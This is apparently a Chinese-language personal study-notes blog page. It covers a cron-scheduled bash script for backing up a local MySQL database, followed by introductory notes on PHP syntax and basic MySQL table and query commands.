<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># 备份目录</span></span><br><span class="line">BACKUP=/data/backup/db</span><br><span class="line"><span class="comment">#/usr/local/phpstudy/soft/mysql/mysql-5.7.27/data/mysql/help_topic.ibd</span></span><br><span class="line"><span class="comment"># 当前时间</span></span><br><span class="line">DATETIME=$(<span class="built_in">date</span> +%Y-%m-%d_%H%M%S)</span><br><span class="line"><span class="comment">#echo $DATATIME</span></span><br><span class="line"><span class="comment">#数据库地址</span></span><br><span class="line">HOST=localhost</span><br><span class="line"><span class="comment">#数据库用户名		#这个在小皮面板可以找到</span></span><br><span class="line">DB_USER=test3</span><br><span class="line"><span class="comment">#数据库密码</span></span><br><span class="line">DB_PWD=test3</span><br><span class="line"><span class="comment">#备份的数据库名</span></span><br><span class="line">DATABASE=dvwa</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建备份目录，如果不存在，则创建</span></span><br><span class="line"><span class="comment">#左边命令执行才会执行右边命令</span></span><br><span class="line"><span class="comment">#非文件夹 ! -d</span></span><br><span class="line">[ ! -d <span class="string">&quot;<span class="variable">$&#123;BACKUP&#125;</span>/<span class="variable">$DATETIME</span>&quot;</span> ] &amp;&amp; <span class="built_in">mkdir</span> -p <span class="string">&quot;<span class="variable">$&#123;BACKUP&#125;</span>/<span class="variable">$DATETIME</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#备份数据库	mysqldump使用ln -fs 源 /usr/bin（源使用locate mysqldump | grep phpstudy找到）</span></span><br><span class="line">mysqldump -u<span class="variable">$&#123;DB_USER&#125;</span> -p<span class="variable">$&#123;DB_PWD&#125;</span> --host=<span class="variable">$&#123;HOST&#125;</span> -q -R --databases <span class="variable">$&#123;DATABASE&#125;</span> | gzip &gt; <span class="variable">$BACKUP</span>/<span class="variable">$DATETIME</span>/<span class="variable">$DATETIME</span>.sql.gz</span><br><span class="line"><span class="comment">#将文件处理成 tar.gz</span></span><br><span class="line"><span class="built_in">cd</span> <span class="variable">$BACKUP</span></span><br><span class="line">tar -zcvf <span class="variable">$DATETIME</span>.tar.gz <span class="variable">$DATETIME</span></span><br><span class="line"><span class="comment"># 删除被备份的文件</span></span><br><span class="line"><span class="built_in">rm</span> -rf <span class="variable">$BACKUP</span>/<span class="variable">$DATETIME</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#删除10天前的备份文件</span></span><br><span class="line">find <span class="variable">$BACKUP</span> -atime +10 -name <span class="string">&quot;.tar.gz&quot;</span> -<span class="built_in">exec</span> <span class="built_in">rm</span> &#123;&#125; \;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;备份数据库完成&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">crontab -e</span><br><span class="line">	30 2 * * * sh /usr/sbin/p106_backup_db.sh	<span class="comment">#每天2点半执行</span></span><br><span class="line">crontab -l		<span class="comment">#查询有哪些定时任务</span></span><br></pre></td></tr></table></figure>



<h1 id="php"><a href="#php" class="headerlink" title="php"></a>php</h1><h2 id="一"><a href="#一" class="headerlink" title="一"></a>一</h2><h3 id="1-PHP是什么"><a href="#1-PHP是什么" class="headerlink" title="1.PHP是什么"></a>1.PHP是什么</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Hypertext Preprocessor超文本预处理器，一种开源通用服务器端脚本语言</span><br><span class="line">通用：跨平台</span><br><span class="line">开源</span><br><span class="line">免费</span><br><span class="line">服务器端：必须安装在服务器环境下才可以使用</span><br><span class="line">脚本语言：解释性语言，按编写顺序执行，指i不需要编译由解释器或虚拟机直接执行的语言</span><br></pre></td></tr></table></figure>

<h3 id="2-PHP能做什么"><a href="#2-PHP能做什么" class="headerlink" title="2.PHP能做什么"></a>2.PHP能做什么</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">快速动态地生成HTML页面</span><br><span class="line">返回前端需要的各种类型数据</span><br><span class="line">高效处理表单数据</span><br><span class="line">安全操作服务器文件</span><br><span class="line">控制与客户端地会话Cookie/Session</span><br><span class="line">对用户行为进行授权控制</span><br><span class="line">高效安全操作数据库</span><br><span class="line">扩展加密压缩</span><br><span class="line">提供接口包括小程序app其他语言</span><br></pre></td></tr></table></figure>

<h3 id="3-程序执行流程"><a href="#3-程序执行流程" class="headerlink" title="3.程序执行流程"></a>3.程序执行流程</h3><p><img src="/2023/07/05/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/1653028153671.png" alt="1653028153671"></p>
<h2 id="二"><a href="#二" class="headerlink" title="二"></a>二</h2><h3 id="1-环境介绍"><a href="#1-环境介绍" class="headerlink" title="1.环境介绍"></a>1.环境介绍</h3><h3 id="1-web"><a href="#1-web" class="headerlink" title="1.web"></a>1.web</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">web服务：apache	nginx</span><br><span class="line">PHP：多版本</span><br><span class="line">MySQL：多版本</span><br></pre></td></tr></table></figure>

<h3 id="2-环境集成包"><a href="#2-环境集成包" class="headerlink" title="2.环境集成包"></a>2.环境集成包</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">直接用phpstudy</span><br></pre></td></tr></table></figure>

<h2 id="三"><a href="#三" class="headerlink" title="三"></a>三</h2><h3 id="1-php程序"><a href="#1-php程序" class="headerlink" title="1.php程序"></a>1.php程序</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">默认扩展名.php可包含html,css,javascript</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//php标记</span></span><br><span class="line"><span class="meta">&lt;?php</span> ... <span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//语句结束符</span></span><br><span class="line">; &#123;&#125;</span><br><span class="line"><span class="comment">//注释符</span></span><br><span class="line"><span class="comment">//单行	/*多行注释*/</span></span><br><span class="line"><span class="comment">//合理使用空白符课增加代码可读性</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2-php代码"><a href="#2-php代码" class="headerlink" title="2.php代码"></a>2.php代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//echo可输出一个或多个字符串，用逗号隔开</span></span><br><span class="line"><span class="comment">//print只允许输出一个字符串</span></span><br><span class="line"><span class="comment">//中文乱码</span></span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="3-变量"><a href="#3-变量" class="headerlink" title="3.变量"></a>3.变量</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//$开头,开头非数字，中间没空格</span></span><br><span class="line"><span class="comment">//=赋值</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//标量</span></span><br><span class="line"><span class="comment">//布尔型	整型		浮点型		字符串型</span></span><br><span class="line"><span class="comment">//var_dump()显示类型打印</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;			<span class="comment">//这个可以换行</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//特殊数据类型</span></span><br><span class="line"><span class="comment">//控制NULL:表示变量没有值</span></span><br><span class="line"><span class="comment">//resource:资源</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//数组</span></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$arr_1</span> = [<span class="number">2312</span>,<span class="number">31321</span>,<span class="number">312321</span>,<span class="string">&#x27;eqwe&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//多维数组</span></span><br></pre></td></tr></table></figure>

<h3 id="4-循环"><a href="#4-循环" class="headerlink" title="4.循环"></a>4.循环</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//键值对 arr为一个数组</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$k</span> . <span class="variable">$v</span> . <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//此处array为二维数组</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$k</span> . <span class="variable">$v</span> . <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$v</span> <span class="keyword">as</span> <span class="variable">$kv</span> =&gt; <span class="variable">$vv</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$kv</span> . <span class="variable">$vv</span> . <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="5-条件判断"><a href="#5-条件判断" class="headerlink" title="5.条件判断"></a>5.条件判断</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//三元运算符</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;hyy&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span> ? <span class="string">&#x27;woshihyy&#x27;</span> : <span class="string">&#x27;wobuzhidao woshei&#x27;</span> . <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">//if()&#123;&#125;elseif()&#123;&#125;elseif()&#123;&#125;elseif()&#123;&#125;else&#123;&#125;</span></span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$str</span>)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;fd&#x27;</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;sdd&#x27;</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;hyy&#x27;</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hyy&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="6-函数"><a href="#6-函数" class="headerlink" title="6.函数"></a>6.函数</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//系统内置函数见此链接</span></span><br><span class="line">file:<span class="comment">///D:/phpStudy/WWW/LearningPHP/php8%E8%AF%BE%E4%BB%B601/9.%E5%87%BD%E6%95%B0.html</span></span><br><span class="line"><span class="comment">//自定义函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun_name</span>(<span class="params">参数列表</span>)</span>&#123;</span><br><span class="line">    <span class="comment">//函数体</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="7-运算符"><a href="#7-运算符" class="headerlink" title="7.运算符"></a>7.运算符</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//同其他语言</span></span><br></pre></td></tr></table></figure>

<h3 id="8-循环"><a href="#8-循环" class="headerlink" title="8.循环"></a>8.循环</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//while()&#123;&#125;</span></span><br><span class="line"><span class="comment">//do&#123;&#125;while()</span></span><br><span class="line"><span class="comment">//for($int=1;$int&lt;10;$int++)&#123;&#125;</span></span><br><span class="line"><span class="comment">//continue break同其他</span></span><br></pre></td></tr></table></figure>



<h2 id="四"><a href="#四" class="headerlink" title="四"></a>四</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//php与html混编需要php后缀</span></span><br><span class="line"><span class="comment">//php8有JIT会加快cpu运行速度</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="五-有关数据库"><a href="#五-有关数据库" class="headerlink" title="五.有关数据库"></a>五.有关数据库</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//	http://localhost/LearningPHP/PDO/PDO.html</span></span><br><span class="line"><span class="variable">$pdo</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&#x27;mysql:host=localhost;dbname=dvwa&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&#x27;SELECT * FROM users&#x27;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"><span class="variable">$arr</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetchAll</span>();</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$arr</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="六-超全局变量"><a href="#六-超全局变量" class="headerlink" title="六.超全局变量"></a>六.超全局变量</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//超全局变量在php4.1.0之后被启用，是php系统中自带的变量，在一个脚本的全部作用域均可用</span></span><br><span class="line"><span class="variable">$_GET</span><span class="comment">//收集来自method=&#x27;get&#x27;表单的值</span></span><br><span class="line"><span class="variable">$_POST</span><span class="comment">//			 &#x27;post&#x27;</span></span><br><span class="line"><span class="variable">$_COOKIE</span><span class="comment">//常用于识别用户</span></span><br><span class="line"><span class="variable">$_REQUEST</span><span class="comment">//包含$_POST $_GET $_COOKIE</span></span><br><span class="line"><span class="variable">$GLOBALS</span><span class="comment">//全部变量的全局组合数组		普通变量也有</span></span><br><span class="line"><span class="variable">$_SESSION</span><span class="comment">//存储用户会话(session)的信息</span></span><br><span class="line"><span class="variable">$_FILES</span><span class="comment">//用来获取通过POST方法上传文件的相关信息</span></span><br><span class="line"><span class="variable">$_SERVER</span><span class="comment">//服务器和执行环境信息</span></span><br><span class="line"><span class="variable">$_ENV</span><span class="comment">//环境变量</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="七-类和对象"><a href="#七-类和对象" class="headerlink" title="七.类和对象"></a>七.类和对象</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Teacher</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;hyy01&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//实例化</span></span><br><span class="line"><span class="variable">$hyy</span> = <span class="keyword">new</span> <span class="title class_">Teacher</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h1><h3 id="创建表"><a href="#创建表" class="headerlink" title="创建表"></a>创建表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">create table tb5(</span><br><span class="line">Id int not null auto_increment primary key, --不允许空	主键	自增</span><br><span class="line">name varchar(16) not null,</span><br><span class="line">age int default 3	--默认值</span><br><span class="line">)default charset=utf8</span><br><span class="line">删除表 drop table 表名</span><br><span class="line">清空表 delete from 表名;</span><br><span class="line">truncate table 表名;速度快无法回撤</span><br></pre></td></tr></table></figure>



<h3 id="修改表"><a href="#修改表" class="headerlink" title="修改表"></a>修改表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">alter table 表名 add 列名 类型</span><br><span class="line">修改列 alter table 表名 change 原列名 新列名 新类型;</span><br><span class="line">use hyy19;</span><br><span class="line">ALTER table hyy01 change id id int not null primary auto_increment;</span><br><span class="line">添加列</span><br><span class="line">alter table 表名 add 列名 类型;</span><br><span class="line">删除列</span><br><span class="line">alter table 表名 drop column 列名</span><br><span class="line">修改列类型</span><br><span class="line">alter table 表名 modify column 列名 类型;</span><br><span class="line">修改列默认值</span><br><span class="line">alter table 表名 alter 列名 set default 1000; </span><br><span class="line">删除列 默认值</span><br><span class="line">alter table 表名 alter 列名 drop default </span><br><span class="line">删除添加主键</span><br><span class="line">alter table 表名 add/drop primary key</span><br></pre></td></tr></table></figure>

<h3 id="列类型"><a href="#列类型" class="headerlink" title="列类型"></a>列类型</h3><h4 id="整型"><a href="#整型" class="headerlink" title="整型"></a>整型</h4><p>int			有符号-2e31~2e31-1</p>
<p>int unsigned		无符号0~2e32-1</p>
<p>int(5)zerofill		仅用于显示，不满5位左补零，满足正常显示</p>
<h4 id="小数"><a href="#小数" class="headerlink" title="小数"></a>小数</h4><p>decimal精确的小数数值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">create table L2(</span><br><span class="line">	id int not null primary key auto_increment,</span><br><span class="line">    salary decimal(8,2)			--数字总共8位，2位小数点</span><br><span class="line">)</span><br><span class="line">FLOAT单精度浮点数											32位</span><br><span class="line">DOUBLE双精度浮点数（非准确小数值）		64位</span><br></pre></td></tr></table></figure>

<h4 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">char(m)			定长字符串最多255，m长					无论如何是用m个字符存储</span><br><span class="line">varchar(m）	变长字符串长度最多65535个字符		实际占多少</span><br></pre></td></tr></table></figure>

<h3 id="时间相关"><a href="#时间相关" class="headerlink" title="时间相关"></a>时间相关</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">datetime				存多少显示多少</span><br><span class="line">YYYY-MM-DD HH:MM:SS (1000-01-01 00:00:00/9999-12-31 23:59:59)</span><br><span class="line">timestamp				和时区有关系</span><br><span class="line">YYYY-MM-DD HH:MM:SS (1970-01-01 00:00:00/2037）</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CREATE table L5(</span><br><span class="line">  id int not null primary key auto_increment,</span><br><span class="line">  dt datetime,</span><br><span class="line">  tt timestamp</span><br><span class="line">  )default charset=utf8</span><br><span class="line">insert into L5 (dt, tt) values(&#x27;2025-11-11 11:11:12&#x27;,&#x27;2023-12-21 12:32:12&#x27;)</span><br></pre></td></tr></table></figure>

<h3 id="内置客户端操作-增删改查"><a href="#内置客户端操作-增删改查" class="headerlink" title="内置客户端操作-增删改查"></a>内置客户端操作-增删改查</h3><h4 id="新增"><a href="#新增" class="headerlink" title="新增"></a>新增</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into 表名（列名1，列名2，列名3） values=（&#x27;列1值‘，’列2值‘，列3值’）</span><br></pre></td></tr></table></figure>

<h4 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">delete from 表名;</span><br><span class="line">delete from 表名 where 条件;</span><br><span class="line">e.g.</span><br><span class="line">delete from tb1 where name=&#x27;wupeiji&#x27;</span><br></pre></td></tr></table></figure>

<h4 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">update 表名 set 列名=值；</span><br><span class="line">update 表名 set 列名=值 where 条件；</span><br><span class="line">e.g.</span><br><span class="line">update tb1 set name=&#x27;huyaoyao&#x27;;</span><br><span class="line">update tb1 set name=&#x27;huyaoyao&#x27; where id=1;</span><br></pre></td></tr></table></figure>

<h4 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from 表名；</span><br><span class="line">select 列名，列名，列名 from 表名；</span><br><span class="line">select * from 表名 where 条件;</span><br></pre></td></tr></table></figure>

<h1 id="必备SQL和表的关系及授权"><a href="#必备SQL和表的关系及授权" class="headerlink" title="必备SQL和表的关系及授权"></a>必备SQL和表的关系及授权</h1><h2 id="1-必备SQL语句"><a href="#1-必备SQL语句" class="headerlink" title="1.必备SQL语句"></a>1.必备SQL语句</h2><h3 id="1-1条件"><a href="#1-1条件" class="headerlink" title="1.1条件"></a>1.1条件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select * from info where age &gt; 30</span><br><span class="line">select * from info where id in (1, 4, 6)</span><br><span class="line">#	查询depart表id=3是否存在，存在执行前面的select</span><br><span class="line">select * from info where exists (select * from depart where id=3)</span><br><span class="line">#	括号里面是临时的表</span><br><span class="line">select * from (select * from info where id&gt;5) as t where age&gt;10</span><br></pre></td></tr></table></figure>

<h3 id="1-2通配符"><a href="#1-2通配符" class="headerlink" title="1.2通配符"></a>1.2通配符</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#	%	表示n个字符</span><br><span class="line">#	_	表示1个字符</span><br><span class="line">select * from info where name like &#x27;%y%&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="1-3映射"><a href="#1-3映射" class="headerlink" title="1.3映射"></a>1.3映射</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#注意看NM的位置</span><br><span class="line">select id, name as NM from info</span><br><span class="line">select id, name, 666 as num,</span><br><span class="line">	(select max(id) from depart) as mid,		-- max/min/sum</span><br><span class="line">	(select min(id) from depart) as nid,</span><br><span class="line">	age from info</span><br><span class="line">	</span><br><span class="line">select id, name,</span><br><span class="line">	(select title from depart where depart.id = info.id) as x1,</span><br><span class="line">	#</span><br><span class="line">	(select title from depart where depart.id = info.depart_id) as x2 from info;</span><br></pre></td></tr></table></figure>

<h3 id="1-4排序"><a href="#1-4排序" class="headerlink" title="1.4排序"></a>1.4排序</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#desc倒序	asc顺序</span><br><span class="line">select * from info order by age desc</span><br><span class="line"></span><br><span class="line">select * from info where id&gt;6 or name like &#x27;%y&#x27; order by age, id desc</span><br></pre></td></tr></table></figure>

<h3 id="1-5取部分"><a href="#1-5取部分" class="headerlink" title="1.5取部分"></a>1.5取部分</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">select * from info limit 5 offset 2; 	--从位置2开始获取前5条数据</span><br><span class="line">select * from info where id &gt; 10 order by id desc limit 3;		--先排序再取</span><br><span class="line"></span><br><span class="line">#逐页</span><br><span class="line">select * from info limit 10 offset 0;</span><br><span class="line">select * from info limit 10 offset 10;</span><br><span class="line">select * from info limit 10 offset 20;</span><br><span class="line">select * from info limit 10 offset 30;</span><br><span class="line">select * from info limit 10 offset 40;</span><br></pre></td></tr></table></figure>

<h3 id="1-6分组"><a href="#1-6分组" class="headerlink" title="1.6分组"></a>1.6分组</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> age, <span class="built_in">max</span>(id), <span class="built_in">min</span>(id), <span class="built_in">count</span>(id), <span class="built_in">sum</span>(id), <span class="built_in">avg</span>(id) <span class="keyword">from</span> info <span class="keyword">group</span> <span class="keyword">by</span> age</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> age, <span class="built_in">count</span>(id) <span class="keyword">from</span> info <span class="keyword">where</span> id <span class="operator">&gt;</span> <span class="number">2</span> <span class="keyword">group</span> <span class="keyword">by</span> age <span class="keyword">having</span> <span class="built_in">count</span>(id) <span class="operator">&gt;</span> <span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> age <span class="keyword">desc</span> limit <span class="number">1</span>;</span><br></pre></td></tr></table></figure>

